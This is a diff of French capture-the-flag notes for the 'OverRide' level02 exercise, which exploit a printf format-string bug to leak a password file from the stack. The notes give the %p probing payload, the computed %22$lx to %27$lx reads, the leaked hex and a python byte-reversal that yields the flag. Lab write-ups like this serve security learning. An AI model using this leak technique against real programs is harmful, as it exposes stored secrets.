@@ -15,7 +15,7 @@ level02@OverRide:~$
 ➜  override git:(main) ✗ scp -P 4242 level02@192.168.1.28:/home/users/level02/level02 ./bin/.
 
 
-decompilation 	https://dogbolt.org/
+décompilation 	https://dogbolt.org/
 
 
 on peut utiliser 
@@ -23,13 +23,13 @@ on peut utiliser
 avec
 	printf(s);
 
-printf n'est pas proteger par un format imposer.
+printf n'est pas protégé par un format imposé.
 payload de 100 octets max 
 
 stream = fopen("/home/users/level03/.pass", "r");
 v7 = fread(ptr, 1u, 0x29u, stream);
 
-donc on peut recuperer le pass qui est stocker dans "ptr" il suffit de le lire
+donc on peut recuperer le pass qui est stocké dans "ptr" il suffit de le lire
 
 
 aaaaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
@@ -48,10 +48,10 @@ comment on sait qu'a partir du 6eme arg de printf on atteint la pile ?
 
 
 on vas aller lire le contenu de ptr depuis le printf on sait que:
-- a partir du 6eme arg de printf (%6$p) on atteint la pile (rsp) car on a passer les 6 reg (rdi, rsi, rdx, rcx,r8, r9)
+- a partir du 6eme arg de printf (%6$p) on atteint la pile (rsp) car on a passé les 6 reg (rdi, rsi, rdx, rcx,r8, r9)
 - char ptr[48]; // [rsp+80h] [rbp-A0h] BYREF
 - ptr est a rsp+80h donc 80(hexa) == 128(dec) / 8(octets par bloc de pile) = 16 + 6(argument avant la pile lue par printf) = 22.
-	on devrais donc avoir le contenu de ptr (le fichier pass lue) a partir du 22eme argument
+	on devrait donc avoir le contenu de ptr (le fichier pass lu) a partir du 22eme argument
 - ptr fait 41 octets donc il faut (41/8(taille bloc)) +-= 6 bloc pour tout lire 
 - donc de 22 a 27 (%22$lx %23$lx %24$lx %25$lx %26$lx %27$lx)
 
@@ -71,7 +71,7 @@ level02@OverRide:~$ ./level02
 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 does not have access!
 
 
-on utilise un script pour inverser les octets (litle endian):
+on utilise un script pour inverser les octets (little endian):
 
 ➜  override git:(main) ✗ python3 -c 'print("".join(bytes.fromhex(x)[::-1].decode() for x in "756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d".split()))'
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
